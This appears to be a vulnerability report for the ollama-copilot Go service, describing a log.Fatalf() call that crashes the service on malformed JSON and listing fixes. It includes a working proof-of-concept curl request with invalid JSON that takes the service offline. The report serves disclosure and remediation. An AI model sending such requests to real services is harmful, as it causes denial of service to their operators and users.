
version: d6ab7a2

- Location: completion_handler.go:96 - log.Fatalf() in JSON parsing
- Impact: Complete service crash from single malformed request

🚨 Immediate Actions Required:
1. Replace log.Fatalf() with proper error handling
2. Add request size limits (1MB max)
3. Implement proper authentication
4. Add comprehensive input validation


## Exploitation Proof:

```bash
# Single request that crashes the entire service:
curl -X POST https://target:11436/v1/engines/copilot-codex/completions \
  -H "Content-Type: application/json" \
  -d '{"prompt": "test", "suffix": test}'

./ollama-copilot
2025/09/11 06:27:24 request: POST /v1/engines/copilot-codex/completions
2025/09/11 06:27:24 error decode: unexpected EOF
```

The service is currently offline due to successful vulnerability verification during esting.


Reference：
https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h